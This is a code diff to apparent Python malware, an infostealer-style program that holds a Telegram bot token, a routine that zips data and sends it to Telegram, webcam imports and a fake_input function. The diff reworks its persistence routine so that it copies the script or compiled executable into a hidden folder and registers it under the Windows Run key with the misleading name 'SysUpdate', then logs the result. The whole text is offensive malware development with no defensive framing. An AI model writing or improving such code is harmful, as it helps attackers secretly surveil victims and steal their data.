@@ -27,6 +27,7 @@ import cv2
 # import nss
 import threading
 import ctypes
+import sys
 
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
@@ -296,16 +297,27 @@ def send_zip_to_telegram():
 # === PERSISTENCE ===
 def persist():
     try:
-        path = os.path.abspath(__file__)
-        dest_path = os.path.join(EXTRACT_FOLDER, os.path.basename(path))
+        exe_name = os.path.basename(sys.executable) if getattr(sys, 'frozen', False) else os.path.basename(__file__)
+        dest_path = os.path.join(EXTRACT_FOLDER, exe_name)
+
         if not os.path.exists(dest_path):
-            shutil.copy2(path, dest_path)
+            shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, dest_path)
             subprocess.call(f'attrib +h "{dest_path}"', shell=True)
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
-        winreg.CloseKey(key)
-    except: pass
+
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        reg_key = "SysUpdate"
+
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, reg_key, 0, winreg.REG_SZ, dest_path)
+
+        log_path = os.path.join(EXTRACT_FOLDER, "persistence_log.txt")
+        with open(log_path, "w") as f:
+            f.write(f"Persistence set to: {dest_path}\n")
+
+    except Exception as e:
+        with open(os.path.join(EXTRACT_FOLDER, "persistence_error.txt"), "w") as f:
+            f.write(f"Persist failed: {e}")
+
 
 def fake_input():
     for _ in range(3):
